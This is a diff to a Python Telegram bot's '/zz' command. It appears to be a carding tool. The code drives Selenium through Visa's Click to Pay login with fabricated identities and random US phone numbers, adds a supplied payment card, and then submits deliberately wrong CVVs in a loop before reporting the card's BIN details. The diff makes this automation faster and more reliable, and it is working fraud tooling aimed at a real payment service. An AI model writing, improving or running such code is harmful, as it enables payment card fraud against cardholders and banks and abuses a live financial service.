@@ -5499,9 +5499,9 @@ async def ko_cmd(update, context):
     }
     Process(target=run_ko_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7.5 /zz Command (FINAL - ORIGINAL STYLE + FIXED FLOW) ==== #
+# ==== 7.5 /zz Command (FINAL ELITE VERSION) ==== #
 def run_zz_process(card_input, update_dict):
-    """ZZ Mode - FINAL (FAST + ORIGINAL OUTPUT STYLE)"""
+    """ZZ Mode - FINAL (FAST + STABLE + PERFECT INPUT/CLICKS)"""
     import random, traceback, time
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
@@ -5511,11 +5511,18 @@ def run_zz_process(card_input, update_dict):
     start = time.time()
     driver = None
 
+    def safe_click(el):
+        try:
+            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
+            driver.execute_script("arguments[0].click();", el)
+        except:
+            pass
+
     try:
         killer_edit_message(update_dict, "⚙️ Processing your request...")
 
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 3)  # ⚡ FAST
+        wait = WebDriverWait(driver, 3)
 
         driver.get("https://src.visa.com/login")
 
@@ -5525,9 +5532,9 @@ def run_zz_process(card_input, update_dict):
         try:
             time.sleep(1.5)
             btn = WebDriverWait(driver, 6).until(
-                EC.element_to_be_clickable((By.CSS_SELECTOR, "a.wscrOk"))
+                EC.presence_of_element_located((By.CSS_SELECTOR, "a.wscrOk"))
             )
-            driver.execute_script("arguments[0].click();", btn)
+            safe_click(btn)
         except:
             pass
 
@@ -5538,27 +5545,26 @@ def run_zz_process(card_input, update_dict):
 
         wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
 
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located(
-                (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
-            ))
-        )
+        safe_click(wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
+        )))
 
         phone = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
         driver.execute_script("arguments[0].value='';", phone)
-        phone.send_keys("202" + "".join(random.choices("0123456789", k=7)))
 
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located(
-                (By.XPATH, "//input[@type='checkbox']")
-            ))
-        )
+        # ✅ VALID USA PHONE
+        area = random.choice(["201","202","203","205","206","207","208","209"])
+        exchange = random.choice(["201","202","303","404","505","606","707","808","909"])
+        line = "".join(random.choices("0123456789", k=4))
+        phone.send_keys(area + exchange + line)
 
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located(
-                (By.XPATH, "//button[.//div[normalize-space()='Next']]")
-            ))
-        )
+        safe_click(wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//input[@type='checkbox']")
+        )))
+
+        safe_click(wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
+        )))
 
         # ================================
         # STEP 2 — CARD
@@ -5598,19 +5604,16 @@ def run_zz_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
         wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        # ADD CARD (NEW FIXED BUTTON)
-        driver.execute_script("arguments[0].click();",
-            wait.until(EC.presence_of_element_located(
-                (By.XPATH, "//div[normalize-space()='Add card']")
-            ))
-        )
+        safe_click(wait.until(EC.presence_of_element_located(
+            (By.XPATH, "//div[normalize-space()='Add card']")
+        )))
 
         # ================================
-        # STEP 4 — CVV LOOP (ZZ STYLE)
+        # STEP 4 — CVV LOOP (FAST)
         # ================================
         used = {wrong_cvv}
 
-        for _ in range(5):  # total 6 tries
+        for _ in range(5):
             fake = killer_get_wrong_cvv(real_cvv)
             while fake in used:
                 fake = killer_get_wrong_cvv(real_cvv)
@@ -5622,22 +5625,17 @@ def run_zz_process(card_input, update_dict):
                 field.send_keys(Keys.CONTROL + "a")
                 field.send_keys(fake)
 
-                driver.execute_script("arguments[0].click();",
-                    wait.until(EC.presence_of_element_located(
-                        (By.XPATH, "//div[normalize-space()='Add card']")
-                    ))
-                )
+                safe_click(wait.until(EC.presence_of_element_located(
+                    (By.XPATH, "//div[normalize-space()='Add card']")
+                )))
 
-                time.sleep(0.5)
+                time.sleep(0.4)
 
             except:
                 pass
 
         duration = round(time.time() - start, 2)
 
-        # ================================
-        # ✅ ORIGINAL ZZ RESULT STYLE
-        # ================================
         killer_edit_message(update_dict,
             f"💳 **Card:** `{short_card}`\n"
             f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
@@ -5652,12 +5650,8 @@ def run_zz_process(card_input, update_dict):
     except Exception as e:
         trace = traceback.format_exc()
 
-        # CLEAN USER MESSAGE
         killer_edit_message(update_dict, "❌ Request timeout, try again.")
-
-        # ADMIN DEBUG
         killer_admin_report("zz", trace, driver)
-
         record_cmd_failure("zz")
 
     finally:
